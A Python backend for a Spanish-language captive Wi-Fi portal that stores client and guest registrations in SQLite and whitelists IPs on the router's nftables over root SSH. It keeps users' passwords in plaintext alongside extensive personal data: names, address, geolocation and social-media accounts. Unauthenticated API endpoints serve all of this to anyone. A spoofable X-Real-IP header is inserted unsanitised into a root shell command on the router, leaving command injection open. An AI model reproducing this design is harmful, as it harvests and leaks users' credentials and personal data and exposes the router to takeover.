"""
Portal cautivo Lentium — backend con registro de clientes e invitados.
Persiste registros en SQLite y autoriza cada IP en nftables del router.
"""

import http.server
import subprocess
import sqlite3
import hashlib
import json
import logging
import time
import os
from pathlib import Path

# =============================================================================
# Logging
# =============================================================================
LOG_LEVEL = os.environ.get("LOG_LEVEL", "INFO").upper()
logging.basicConfig(
    level=getattr(logging, LOG_LEVEL, logging.INFO),
    format="%(asctime)s %(levelname)-8s [%(funcName)s] %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%S",
)
log = logging.getLogger("captive-lentium")

# =============================================================================
# Configuración
# =============================================================================
ROUTER_IP   = os.environ.get("ROUTER_IP",   "192.168.1.1")
ROUTER_USER = os.environ.get("ROUTER_USER", "root")
SSH_KEY     = os.environ.get("SSH_KEY",     "/opt/keys/captive-portal")
PORTAL_IP   = os.environ.get("PORTAL_IP",   "192.168.1.167")
DB_PATH     = os.environ.get("DB_PATH",     "/data/lentium.db")
PORT        = int(os.environ.get("PORT",    "8080"))
NFT_SET     = "ip captive allowed_clients"

log.info("=== Lentium Portal Backend iniciando ===")
log.info(f"ROUTER_IP={ROUTER_IP}  PORTAL_IP={PORTAL_IP}  DB_PATH={DB_PATH}  PORT={PORT}")

# =============================================================================
# SQLite — schema
# =============================================================================
def _db_connect() -> sqlite3.Connection:
    Path(DB_PATH).parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    with _db_connect() as conn:
        conn.executescript("""
            PRAGMA journal_mode=WAL;

            CREATE TABLE IF NOT EXISTS clientes (
                id            INTEGER PRIMARY KEY AUTOINCREMENT,
                telefono      TEXT NOT NULL,
                pwd_plano     TEXT NOT NULL,
                pwd_hash      TEXT NOT NULL,
                ip            TEXT,
                registrado_en TEXT DEFAULT (datetime('now')),
                ultima_sesion TEXT
            );

            CREATE TABLE IF NOT EXISTS invitados (
                id                INTEGER PRIMARY KEY AUTOINCREMENT,
                nombre            TEXT NOT NULL,
                apellido_paterno  TEXT NOT NULL,
                apellido_materno  TEXT NOT NULL,
                telefono          TEXT NOT NULL,
                direccion_texto   TEXT,
                direccion_geo     TEXT,
                pwd_plano         TEXT NOT NULL,
                pwd_hash          TEXT NOT NULL,
                redes_sociales    TEXT,
                ip                TEXT,
                registrado_en     TEXT DEFAULT (datetime('now')),
                ultima_sesion     TEXT
            );
        """)
    log.info(f"SQLite listo en {DB_PATH}")


def _hash_pwd(password: str) -> str:
    return hashlib.sha256(password.encode()).hexdigest()


def save_client(telefono: str, password: str, ip: str) -> int:
    h = _hash_pwd(password)
    with _db_connect() as conn:
        cur = conn.execute(
            "SELECT id FROM clientes WHERE telefono=?", (telefono,)
        )
        row = cur.fetchone()
        if row:
            conn.execute(
                "UPDATE clientes SET pwd_plano=?, pwd_hash=?, ip=?, ultima_sesion=datetime('now') WHERE id=?",
                (password, h, ip, row["id"])
            )
            log.info(f"Cliente existente actualizado: telefono={telefono} ip={ip}")
            return row["id"]
        cur2 = conn.execute(
            "INSERT INTO clientes (telefono, pwd_plano, pwd_hash, ip, ultima_sesion) VALUES (?,?,?,?,datetime('now'))",
            (telefono, password, h, ip)
        )
        log.info(f"Nuevo cliente registrado: telefono={telefono} ip={ip} id={cur2.lastrowid}")
        return cur2.lastrowid


def save_guest(data: dict, ip: str) -> int:
    password = data["password"]
    h = _hash_pwd(password)
    redes = json.dumps(data.get("redes_sociales", []), ensure_ascii=False)
    geo   = json.dumps(data.get("direccion_geo"), ensure_ascii=False) if data.get("direccion_geo") else None
    with _db_connect() as conn:
        cur = conn.execute(
            "SELECT id FROM invitados WHERE telefono=?", (data["telefono"],)
        )
        row = cur.fetchone()
        if row:
            conn.execute(
                """UPDATE invitados SET nombre=?, apellido_paterno=?, apellido_materno=?,
                   direccion_texto=?, direccion_geo=?, pwd_plano=?, pwd_hash=?,
                   redes_sociales=?, ip=?, ultima_sesion=datetime('now') WHERE id=?""",
                (data["nombre"], data["apellido_paterno"], data["apellido_materno"],
                 data.get("direccion_texto"), geo, password, h, redes, ip, row["id"])
            )
            log.info(f"Invitado existente actualizado: telefono={data['telefono']} ip={ip}")
            return row["id"]
        cur2 = conn.execute(
            """INSERT INTO invitados
               (nombre, apellido_paterno, apellido_materno, telefono,
                direccion_texto, direccion_geo, pwd_plano, pwd_hash, redes_sociales, ip, ultima_sesion)
               VALUES (?,?,?,?,?,?,?,?,?,?,datetime('now'))""",
            (data["nombre"], data["apellido_paterno"], data["apellido_materno"],
             data["telefono"], data.get("direccion_texto"), geo, password, h, redes, ip)
        )
        log.info(f"Nuevo invitado registrado: telefono={data['telefono']} ip={ip} id={cur2.lastrowid}")
        return cur2.lastrowid

# =============================================================================
# SSH helper
# =============================================================================
def _router_ssh(description: str, remote_cmd: str, timeout: int = 10) -> tuple[int, str, str]:
    cmd = [
        "ssh",
        "-i", SSH_KEY,
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ConnectTimeout=5",
        "-o", "LogLevel=ERROR",
        f"{ROUTER_USER}@{ROUTER_IP}",
        remote_cmd,
    ]
    t0 = time.monotonic()
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        elapsed = (time.monotonic() - t0) * 1000
        log.debug(f"SSH [{description}] rc={result.returncode} elapsed={elapsed:.0f}ms")
        if result.stderr.strip():
            log.warning(f"SSH [{description}] stderr: {result.stderr.strip()!r}")
        return result.returncode, result.stdout.strip(), result.stderr.strip()
    except subprocess.TimeoutExpired:
        log.error(f"SSH [{description}] TIMEOUT")
        return -1, "", "timeout"
    except Exception as exc:
        log.error(f"SSH [{description}] excepción: {exc}")
        return -1, "", str(exc)

# =============================================================================
# Obtener IP del cliente
# =============================================================================
def get_client_ip(handler) -> str:
    x_real_ip   = handler.headers.get("X-Real-IP", "").strip()
    x_forwarded = handler.headers.get("X-Forwarded-For", "").strip()
    peer_ip     = handler.client_address[0]

    log.info(f"IP headers — X-Real-IP={x_real_ip!r} X-Forwarded-For={x_forwarded!r} peer={peer_ip}")

    if x_real_ip and x_real_ip.startswith("192.168.") and x_real_ip != PORTAL_IP:
        return x_real_ip
    if x_forwarded:
        first = x_forwarded.split(",")[0].strip()
        if first.startswith("192.168.") and first != PORTAL_IP:
            return first

    log.warning("Headers sin IP LAN válida — fallback conntrack")
    rc, stdout, _ = _router_ssh(
        "conntrack-get-ip",
        "cat /proc/net/nf_conntrack"
        " | grep dport=80 | grep ESTABLISHED"
        " | awk '{print $7}' | sed 's/src=//'"
        f" | grep '192.168.1.' | grep -v '{PORTAL_IP}' | head -1"
    )
    if rc == 0 and stdout:
        return stdout

    log.error("No se pudo detectar IP del cliente")
    return ""

# =============================================================================
# Autorizar IP en nftables
# =============================================================================
def authorize_client(client_ip: str) -> bool:
    if not client_ip:
        return False
    rc, _, stderr = _router_ssh(
        f"nft-add-{client_ip}",
        f"nft add element {NFT_SET} {{ {client_ip} }}"
    )
    if rc == 0:
        log.info(f"✔ IP autorizada en nftables: {client_ip}")
        return True
    log.error(f"✘ Falló autorizar {client_ip} — stderr={stderr!r}")
    return False

# =============================================================================
# Validaciones mínimas
# =============================================================================
def _require_fields(data: dict, fields: list[str]) -> str | None:
    for f in fields:
        if not data.get(f, "").strip() if isinstance(data.get(f), str) else not data.get(f):
            return f"Campo requerido: {f}"
    return None

# =============================================================================
# HTTP Handler
# =============================================================================
class Handler(http.server.BaseHTTPRequestHandler):

    def _read_json(self):
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length)
        try:
            return json.loads(body)
        except Exception:
            return {}

    def _respond(self, code: int, body: dict):
        payload = json.dumps(body, ensure_ascii=False).encode()
        self.send_response(code)
        self.send_header("Content-Type",  "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(payload)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(payload)

    def _serve_portal(self):
        """Sirve el portal HTML estático."""
        portal_path = Path(__file__).parent / "portal.html"
        try:
            html = portal_path.read_bytes()
            self.send_response(200)
            self.send_header("Content-Type",  "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(html)))
            self.end_headers()
            self.wfile.write(html)
        except FileNotFoundError:
            self._respond(404, {"error": "portal.html no encontrado"})

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin",  "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_GET(self):
        log.info(f"GET {self.path}  peer={self.client_address[0]}")

        if self.path in ("/", "/portal", "/index.html"):
            self._serve_portal()
            return

        if self.path == "/health":
            rc, stdout, _ = _router_ssh("health-check", "echo pong")
            router_ok = (rc == 0 and stdout == "pong")
            self._respond(200 if router_ok else 503, {
                "status": "ok",
                "router_ssh": "ok" if router_ok else "error",
                "router_ip": ROUTER_IP,
            })
            return

        if self.path == "/accepted":
            html = (
                b"<!DOCTYPE html><html><head><meta charset='UTF-8'>"
                b"<title>Conectado - Lentium</title>"
                b"<style>body{font-family:sans-serif;max-width:400px;margin:40px auto;"
                b"padding:20px;text-align:center}.ok{color:#16a34a;font-size:48px}</style>"
                b"</head><body>"
                b"<div class='ok'>&#10003;</div><h2>Conectado a Lentium</h2>"
                b"<p>Ya puedes navegar... a tu ritmo</p>"
                b"<p><a href='https://google.com'>Ir a internet</a></p>"
                b"</body></html>"
            )
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(html)))
            self.end_headers()
            self.wfile.write(html)
            return

        if self.path == "/api/registros/clientes":
            with _db_connect() as conn:
                rows = conn.execute(
                    "SELECT id,telefono,pwd_plano,pwd_hash,ip,registrado_en,ultima_sesion FROM clientes ORDER BY id DESC"
                ).fetchall()
            self._respond(200, {"clientes": [dict(r) for r in rows]})
            return

        if self.path == "/api/registros/invitados":
            with _db_connect() as conn:
                rows = conn.execute(
                    """SELECT id,nombre,apellido_paterno,apellido_materno,telefono,
                              direccion_texto,pwd_plano,pwd_hash,redes_sociales,ip,registrado_en,ultima_sesion
                       FROM invitados ORDER BY id DESC"""
                ).fetchall()
            result = []
            for r in rows:
                d = dict(r)
                try: d["redes_sociales"] = json.loads(d["redes_sociales"] or "[]")
                except Exception: pass
                result.append(d)
            self._respond(200, {"invitados": result})
            return

        log.warning(f"GET {self.path} — no encontrado")
        self._respond(404, {"error": "not found"})

    def do_POST(self):
        log.info(f"POST {self.path}  peer={self.client_address[0]}")
        data = self._read_json()

        # ── Registro de cliente ──────────────────────────────────────────────
        if self.path == "/api/register/client":
            err = _require_fields(data, ["telefono", "password"])
            if err:
                self._respond(400, {"ok": False, "error": err}); return
            if len(data["password"]) < 8:
                self._respond(400, {"ok": False, "error": "Contraseña mínimo 8 caracteres"}); return

            client_ip = get_client_ip(self)
            save_client(data["telefono"].strip(), data["password"], client_ip)
            ok = authorize_client(client_ip)
            self._respond(200 if ok else 500, {"ok": ok, "ip": client_ip})
            return

        # ── Registro de invitado ─────────────────────────────────────────────
        if self.path == "/api/register/guest":
            err = _require_fields(data, ["nombre","apellido_paterno","apellido_materno","telefono","password"])
            if err:
                self._respond(400, {"ok": False, "error": err}); return
            if len(data["password"]) < 8:
                self._respond(400, {"ok": False, "error": "Contraseña mínimo 8 caracteres"}); return
            if not data.get("redes_sociales"):
                self._respond(400, {"ok": False, "error": "Al menos una red social requerida"}); return

            client_ip = get_client_ip(self)
            save_guest(data, client_ip)
            ok = authorize_client(client_ip)
            self._respond(200 if ok else 500, {"ok": ok, "ip": client_ip})
            return

        # ── Compatibilidad con portal anterior (/accept) ─────────────────────
        if self.path == "/accept":
            client_ip = get_client_ip(self)
            ok = authorize_client(client_ip)
            self._respond(200 if ok else 500, {"ok": ok, "ip": client_ip})
            return

        log.warning(f"POST {self.path} — no encontrado")
        self._respond(404, {"error": "not found"})

    def log_message(self, fmt, *args):
        pass  # usamos nuestro propio logger


# =============================================================================
# Main
# =============================================================================
if __name__ == "__main__":
    init_db()
    addr = ("0.0.0.0", PORT)
    server = http.server.HTTPServer(addr, Handler)
    log.info(f"Escuchando en {addr[0]}:{addr[1]}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        log.info("Servidor detenido")
